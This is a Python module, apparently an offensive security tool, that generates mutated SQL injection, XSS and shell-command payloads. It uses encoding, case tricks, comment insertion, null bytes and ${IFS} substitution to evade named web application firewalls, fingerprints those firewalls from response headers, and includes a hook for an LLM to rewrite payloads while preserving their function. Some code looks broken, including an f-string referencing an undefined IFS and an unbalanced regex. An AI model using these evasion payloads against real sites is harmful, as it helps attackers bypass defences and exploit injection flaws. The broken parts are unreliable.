"""
Tier 2: Polymorphic and Metamorphic Evasion Engine
Advanced payload mutation and WAF bypass techniques.
"""

from typing import List, Dict, Optional
import re
import base64
import urllib.parse
from enum import Enum


class MutationTechnique(Enum):
    """Available mutation techniques"""
    URL_ENCODE = "url_encode"
    BASE64 = "base64"
    HEX = "hex"
    UNICODE = "unicode"
    CASE_VARIATION = "case_variation"
    NULL_BYTE = "null_byte"
    COMMENT_INSERT = "comment_insert"
    WHITESPACE = "whitespace"
    DOUBLE_ENCODE = "double_encode"
    CONCAT_SPLIT = "concat_split"


class WAFType(Enum):
    """Supported WAF types"""
    GENERIC = "generic"
    MODSECURITY = "modsecurity"
    CLOUDFLARE = "cloudflare"
    AWS_WAF = "aws_waf"
    IMPERVA = "imperva"


class PolymorphicEngine:
    """Polymorphic mutation engine for payload obfuscation"""
    
    def __init__(self):
        """Initialize polymorphic engine"""
        self.mutation_count = 0
    
    def mutate(
        self,
        payload: str,
        techniques: List[str] = None,
        count: int = 10
    ) -> List[str]:
        """
        Apply multiple evasion techniques to create variants.
        
        Args:
            payload: Original payload
            techniques: List of techniques to apply (None = use all)
            count: Number of variants to generate
            
        Returns:
            List of mutated payloads
        """
        techniques = techniques or [
            "url_encode", "base64", "hex", "case_variation",
            "comment_insert", "whitespace_variation", "double_encode"
        ]
        
        mutations = set()  # Use set to avoid duplicates
        mutations.add(payload)  # Add original
        
        # Generate mutations using selected techniques
        available_techniques = [
            self.url_encode, self.base64_encode, self.hex_encode,
            self.unicode_encode, self.case_variation, self.null_byte_inject,
            self.comment_insert, self.whitespace_variation,
            self.double_encode, self.concat_split
        ]
        
        for technique in available_techniques:
            if technique.__name__.replace("_", "") in "".join(techniques).lower():
                try:
                    if isinstance(technique(payload), list):
                        for variant in technique(payload):
                            mutations.add(variant)
                            if len(mutations) >= count + 1:
                                return list(mutations)[:count + 1]
                    else:
                        result = technique(payload)
                        if result:
                            mutations.add(result)
                            if len(mutations) >= count + 1:
                                return list(mutations)[:count + 1]
                except Exception:
                    continue
        
        return list(mutations)[:count + 1]
    
    def url_encode(self, payload: str, level: int = 1) -> str:
        """
        Apply URL encoding to payload.
        
        Args:
            payload: Payload to encode
            level: 1 for single, 2 for double encoding
            
        Returns:
            URL-encoded payload
        """
        result = payload
        for _ in range(level):
            result = urllib.parse.quote(result, safe='')
        return result
    
    def base64_encode(self, payload: str) -> str:
        """
        Encode payload in base64.
        
        Args:
            payload: Payload to encode
            
        Returns:
            Base64-encoded payload
        """
        try:
            encoded = base64.b64encode(payload.encode()).decode()
            return f"base64:{encoded}" if len(encoded) < 500 else encoded
        except Exception:
            return payload
    
    def hex_encode(self, payload: str) -> str:
        """
        Encode payload in hexadecimal.
        
        Args:
            payload: Payload to encode
            
        Returns:
            Hex-encoded payload
        """
        try:
            hex_encoded = ''.join(f'{ord(c):02x}' for c in payload)
            return f"0x{hex_encoded}" if len(hex_encoded) < 500 else hex_encoded
        except Exception:
            return payload
    
    def unicode_encode(self, payload: str) -> str:
        """
        Encode payload using Unicode escape sequences.
        
        Args:
            payload: Payload to encode
            
        Returns:
            Unicode-escaped payload
        """
        try:
            result = ""
            for char in payload:
                if char.isalpha() or char.isdigit():
                    # Convert to Unicode escape
                    result += f"\\u{ord(char):04x}"
                else:
                    result += char
            return result
        except Exception:
            return payload
    
    def case_variation(self, payload: str) -> List[str]:
        """
        Generate case variations of payload.
        
        Args:
            payload: Payload to vary
            
        Returns:
            List of case-varied payloads
        """
        variations = []
        
        # Uppercase
        variations.append(payload.upper())
        
        # Lowercase
        variations.append(payload.lower())
        
        # Capitalize
        variations.append(payload.capitalize())
        
        # Alternating case (even positions upper)
        alt1 = ""
        for i, char in enumerate(payload):
            if char.isalpha():
                alt1 += char.upper() if i % 2 == 0 else char.lower()
            else:
                alt1 += char
        variations.append(alt1)
        
        # Alternating case (even positions lower)
        alt2 = ""
        for i, char in enumerate(payload):
            if char.isalpha():
                alt2 += char.lower() if i % 2 == 0 else char.upper()
            else:
                alt2 += char
        variations.append(alt2)
        
        # Random case (every 2nd letter flipped)
        random_case = ""
        flip = False
        for char in payload:
            if char.isalpha():
                random_case += char.upper() if flip else char.lower()
                flip = not flip
            else:
                random_case += char
        variations.append(random_case)
        
        return variations
    
    def null_byte_inject(self, payload: str) -> List[str]:
        """
        Inject null bytes at strategic positions.
        
        Args:
            payload: Payload to inject into
            
        Returns:
            List of null-byte-injected variants
        """
        variants = []
        
        # Null byte at start
        variants.append(f"%00{payload}")
        
        # Null byte at end
        variants.append(f"{payload}%00")
        
        # Null byte after first meaningful character
        if len(payload) > 1:
            for i in range(1, min(5, len(payload))):
                variants.append(payload[:i] + "%00" + payload[i:])
        
        # Multiple null bytes
        if len(payload) > 10:
            variants.append(payload.replace(" ", "%00"))
        
        return variants
    
    def comment_insert(self, payload: str, language: str = "sql") -> str:
        """
        Insert language-specific comments.
        
        Args:
            payload: Payload to modify
            language: Language type (sql, html, shell, c)
            
        Returns:
            Payload with comments inserted
        """
        if language == "sql":
            # SQL comment style: /**/
            # Break up keywords
            result = payload.replace(" AND ", " /**/AND/**/ ")
            result = result.replace(" OR ", " /**/OR/**/ ")
            result = result.replace(" SELECT ", " /**/SELECT/**/ ")
            result = result.replace(" UNION ", " /**/UNION/**/ ")
            result = result.replace(" WHERE ", " /**/WHERE/**/ ")
            result = result.replace(" DROP ", " /**/DROP/**/ ")
            return result
        
        elif language == "html":
            # HTML comment wrapping
            return f"<!--{payload}-->"
        
        elif language == "shell":
            # Shell comment insertion
            result = payload.replace(";", ";#comment\n")
            return result
        
        elif language == "c":
            # C-style comments
            result = payload.replace(" ", " /* */ ")
            return result
        
        return payload
    
    def whitespace_variation(self, payload: str) -> List[str]:
        """
        Generate whitespace variations.
        
        Args:
            payload: Payload to vary
            
        Returns:
            List of whitespace-varied payloads
        """
        variants = []
        
        # Single space to tab
        variants.append(payload.replace(" ", "\t"))
        
        # Single space to double space
        variants.append(payload.replace(" ", "  "))
        
        # Multiple spaces
        variants.append(payload.replace(" ", "   "))
        
        # Space to newline (for multi-line)
        if len(payload) > 20:
            variants.append(payload.replace(" ", "\n"))
        
        # Mixed whitespace
        mixed = ""
        space_variants = [" ", "\t", "  ", "\n"]
        for i, char in enumerate(payload):
            if char == " ":
                mixed += space_variants[i % len(space_variants)]
            else:
                mixed += char
        variants.append(mixed)
        
        # Tab + space combinations
        variants.append(payload.replace(" ", "\t "))
        variants.append(payload.replace(" ", " \t"))
        
        return variants
    
    def double_encode(self, payload: str) -> str:
        """
        Apply double URL encoding.
        
        Args:
            payload: Payload to double-encode
            
        Returns:
            Double-encoded payload
        """
        return self.url_encode(self.url_encode(payload, 1), 1)
    
    def concat_split(self, payload: str, language: str = "sql") -> str:
        """
        Split payload using language-specific concatenation.
        
        Args:
            payload: Payload to split
            language: Language type (sql, shell)
            
        Returns:
            Concatenated payload variant
        """
        if language == "sql":
            # SQL CONCAT function
            # Split at spaces
            parts = payload.split(" ")
            if len(parts) > 1:
                concat_parts = [f"'{part}'" for part in parts]
                return f"CONCAT({','.join(concat_parts)})"
        
        elif language == "shell":
            # Shell concatenation using $IFS (Internal Field Separator)
            # IFS=$'\t' or IFS='.' replacement
            result = payload.replace(" ", "${IFS}")
            return result
        
        return payload


class WAFBypass:
    """WAF detection and bypass techniques"""
    
    # Known WAF signatures and bypass methods
    WAF_SIGNATURES = {
        "modsecurity": {
            "patterns": [
                r"(?i)(union|select|insert|update|delete)",
                r"(?i)(script|javascript|onerror|onclick)",
                r"(?i)(\.\./|\.\.\\)",
            ],
            "bypass_techniques": [
                "case_variation", "url_encode", "comment_insert",
                "null_byte", "whitespace_variation"
            ]
        },
        "cloudflare": {
            "patterns": [
                r"(?i)(union|select|drop)",
                r"(?i)(eval|exec|system|passthru)",
                r"(?i)(<script|javascript:|onerror)",
            ],
            "bypass_techniques": [
                "double_encode", "unicode_encode", "base64"
            ]
        },
        "aws_waf": {
            "patterns": [
                r"(?i)(union.*select|select.*union)",
                r"(?i)(xss|<script)",
                r"(?i)(../|..\)",
            ],
            "bypass_techniques": [
                "whitespace_variation", "comment_insert", "case_variation"
            ]
        },
        "imperva": {
            "patterns": [
                r"(?i)(union|select|where)",
                r"(?i)(system|cmd|exec)",
                r"(?i)(<|>|script)",
            ],
            "bypass_techniques": [
                "concat_split", "hex_encode", "url_encode"
            ]
        }
    }
    
    def __init__(self):
        """Initialize WAF bypass engine"""
        self.polymorphic = PolymorphicEngine()
        self.detected_waf = None
    
    def bypass(self, payload: str, waf_type: str = "generic") -> List[str]:
        """
        Generate WAF-bypass variants.
        
        Args:
            payload: Original payload
            waf_type: Type of WAF to bypass
            
        Returns:
            List of bypass variants
        """
        waf_type = waf_type.lower()
        
        if waf_type not in self.WAF_SIGNATURES and waf_type != "generic":
            waf_type = "generic"
        
        variants = [payload]
        
        if waf_type == "generic":
            # Generic bypass: try all techniques
            techniques = [
                "case_variation", "url_encode", "comment_insert",
                "whitespace_variation", "double_encode"
            ]
        else:
            # WAF-specific techniques
            techniques = self.WAF_SIGNATURES[waf_type]["bypass_techniques"]
        
        for technique in techniques:
            try:
                if technique == "case_variation":
                    variants.extend(self.polymorphic.case_variation(payload))
                
                elif technique == "url_encode":
                    for level in [1, 2]:
                        variants.append(self.polymorphic.url_encode(payload, level))
                
                elif technique == "comment_insert":
                    for lang in ["sql", "html", "shell"]:
                        variants.append(self.polymorphic.comment_insert(payload, lang))
                
                elif technique == "whitespace_variation":
                    variants.extend(self.polymorphic.whitespace_variation(payload))
                
                elif technique == "double_encode":
                    variants.append(self.polymorphic.double_encode(payload))
                
                elif technique == "null_byte":
                    variants.extend(self.polymorphic.null_byte_inject(payload))
                
                elif technique == "unicode_encode":
                    variants.append(self.polymorphic.unicode_encode(payload))
                
                elif technique == "base64":
                    variants.append(self.polymorphic.base64_encode(payload))
                
                elif technique == "hex_encode":
                    variants.append(self.polymorphic.hex_encode(payload))
                
                elif technique == "concat_split":
                    for lang in ["sql", "shell"]:
                        variants.append(self.polymorphic.concat_split(payload, lang))
            
            except Exception:
                continue
        
        # Remove duplicates while preserving order
        unique = []
        seen = set()
        for v in variants:
            if v not in seen:
                unique.append(v)
                seen.add(v)
        
        return unique
    
    def detect_waf(self, response_headers: Dict, response_body: str) -> Optional[str]:
        """
        Detect WAF type from response.
        
        Args:
            response_headers: HTTP response headers
            response_body: Response body content
            
        Returns:
            Detected WAF type or None
        """
        headers_str = str(response_headers).lower()
        body_str = response_body.lower()
        
        # Check headers for WAF signatures
        if "modsecurity" in headers_str:
            self.detected_waf = "modsecurity"
            return "modsecurity"
        
        if "cloudflare" in headers_str or "cf-ray" in headers_str:
            self.detected_waf = "cloudflare"
            return "cloudflare"
        
        if "aws waf" in headers_str:
            self.detected_waf = "aws_waf"
            return "aws_waf"
        
        if "imperva" in headers_str:
            self.detected_waf = "imperva"
            return "imperva"
        
        # Check body for WAF block pages
        if "access denied" in body_str and ("waf" in body_str or "firewall" in body_str):
            return "generic"
        
        return None


class MetamorphicEngine:
    """Semantic payload rewriting and structural variation"""
    
    def __init__(self):
        """Initialize metamorphic engine"""
        self.polymorphic = PolymorphicEngine()
        self.cognitive_engine = None
        
        # SQL keyword synonyms
        self.sql_synonyms = {
            "SELECT": ["SELECT", "sElEcT", "SeLeCt"],
            "UNION": ["UNION", "UnIoN", "uNiOn"],
            "WHERE": ["WHERE", "WhErE"],
            "AND": ["AND", "AnD"],
            "OR": ["OR", "Or"],
            "INSERT": ["INSERT", "InSeRt"],
            "UPDATE": ["UPDATE", "UpDaTe"],
            "DELETE": ["DELETE", "DeLeTe"],
            "DROP": ["DROP", "DrOp"],
            "TABLE": ["TABLE", "TaBlE"],
            "FROM": ["FROM", "FrOm"],
            "JOIN": ["JOIN", "JoIn"],
        }
        
        # Command synonyms
        self.cmd_synonyms = {
            "cat": ["cat", "grep -v '^$'"],
            "ls": ["ls", "find . -maxdepth 1"],
            "id": ["id", "whoami"],
            "whoami": ["whoami", "id -un"],
            "pwd": ["pwd", "echo $PWD"],
        }
    
    def rewrite(self, payload: str, cognitive_engine=None) -> str:
        """
        Semantically rewrite payload while maintaining functionality.
        
        Args:
            payload: Original payload
            cognitive_engine: Optional LLM engine for advanced rewriting
            
        Returns:
            Rewritten payload
        """
        if cognitive_engine:
            try:
                # Use LLM for semantic rewriting
                rewritten = cognitive_engine.rewrite_payload(
                    payload=payload,
                    maintain_functionality=True
                )
                return rewritten if rewritten else payload
            except Exception:
                pass
        
        # Fallback to structural variation
        return self.structural_variation(payload)[0] if self.structural_variation(payload) else payload
    
    def structural_variation(self, payload: str) -> List[str]:
        """
        Generate structural variations that maintain functionality.
        
        Args:
            payload: Original payload
            
        Returns:
            List of structurally varied payloads
        """
        variations = []
        
        # SQL structural variations
        if "SELECT" in payload.upper() or "UNION" in payload.upper():
            # Variation 1: Comment insertion
            sql_commented = self.polymorphic.comment_insert(payload, "sql")
            variations.append(sql_commented)
            
            # Variation 2: Keyword replacement
            keyword_replaced = self.synonym_replace(payload)
            variations.append(keyword_replaced)
            
            # Variation 3: Concatenation
            concat_var = self.polymorphic.concat_split(payload, "sql")
            variations.append(concat_var)
            
            # Variation 4: Whitespace modification
            whitespace_vars = self.polymorphic.whitespace_variation(payload)
            variations.extend(whitespace_vars[:2])
        
        # Command injection variations
        elif ";" in payload or "|" in payload or "`" in payload:
            # Variation 1: IFS substitution
            ifs_var = payload.replace(" ", "${IFS}")
            variations.append(ifs_var)
            
            # Variation 2: $() vs `` quoting
            if "`" in payload:
                variations.append(payload.replace("`", "$()"))
            
            # Variation 3: Backslash escaping
            escaped = payload.replace(" ", "\\ ")
            variations.append(escaped)
        
        # XSS structural variations
        elif "<script" in payload.lower() or "onerror" in payload.lower():
            # Variation 1: Event handler changes
            variations.append(payload.replace("onerror=", "onload="))
            variations.append(payload.replace("onerror=", "onclick="))
            
            # Variation 2: Tag changes
            variations.append(payload.replace("<script>", "<svg onload="))
            variations.append(payload.replace("<script>", "<img onerror="))
        
        if not variations:
            variations.append(payload)
        
        return variations
    
    def synonym_replace(self, payload: str) -> str:
        """
        Replace SQL keywords with case-varied synonyms.
        
        Args:
            payload: Original SQL payload
            
        Returns:
            Payload with replaced keywords
        """
        result = payload
        
        for keyword, variants in self.sql_synonyms.items():
            if keyword in result.upper():
                # Replace with first variant (different case)
                variant = variants[1] if len(variants) > 1 else keyword
                # Case-insensitive replacement
                import re
                result = re.sub(
                    f"\\b{keyword}\\b",
                    variant,
                    result,
                    flags=re.IGNORECASE
                )
        
        return result
    
    def obfuscate_command(self, command: str) -> str:
        """
        Obfuscate shell commands.
        
        Args:
            command: Shell command to obfuscate
            
        Returns:
            Obfuscated command
        """
        # Replace spaces with IFS
        obfuscated = command.replace(" ", "${IFS}")
        
        # Base64 encode portions
        parts = command.split(" ")
        if len(parts) > 1:
            # Keep first part clear, encode rest
            encoded_parts = [parts[0]]
            for part in parts[1:]:
                encoded = base64.b64encode(part.encode()).decode()
                encoded_parts.append(f"$(echo {encoded}|base64${IFS}-d)")
            obfuscated = "${IFS}".join(encoded_parts)
        
        return obfuscated


def main():
    """Example usage"""
    # Polymorphic engine
    poly = PolymorphicEngine()
    payload = "' OR '1'='1"
    mutations = poly.mutate(payload, count=5)
    
    print("=== Polymorphic Engine ===")
    print(f"Original: {payload}")
    print("Mutations:")
    for i, mutation in enumerate(mutations[:5], 1):
        print(f"  {i}. {mutation}")
    
    # WAF bypass
    print("\n=== WAF Bypass ===")
    waf = WAFBypass()
    sql_payload = "UNION SELECT * FROM users"
    bypass_variants = waf.bypass(sql_payload, "cloudflare")
    
    print(f"Original: {sql_payload}")
    print("Bypass variants:")
    for i, variant in enumerate(bypass_variants[:5], 1):
        print(f"  {i}. {variant}")
    
    # Metamorphic engine
    print("\n=== Metamorphic Engine ===")
    meta = MetamorphicEngine()
    sql_payload = "SELECT * FROM users WHERE id=1"
    structural = meta.structural_variation(sql_payload)
    
    print(f"Original: {sql_payload}")
    print("Structural variations:")
    for i, var in enumerate(structural[:3], 1):
        print(f"  {i}. {var}")


if __name__ == "__main__":
    main()
